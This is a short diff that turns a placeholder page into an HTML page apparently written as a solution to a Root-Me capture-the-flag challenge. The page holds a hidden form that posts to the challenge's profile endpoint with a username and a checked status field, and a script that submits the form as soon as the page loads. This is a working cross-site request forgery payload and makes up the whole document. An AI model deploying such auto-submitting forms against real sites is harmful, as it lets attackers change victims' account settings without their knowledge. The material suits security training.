@@ -1,1 +1,12 @@
-<h1>test</h1>
+<html>
+    <body>
+        <h1>test</h1>
+        <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
+            <input type="hidden" name="username" value="re" />
+            <input type="checkbox" name="status" checked >
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
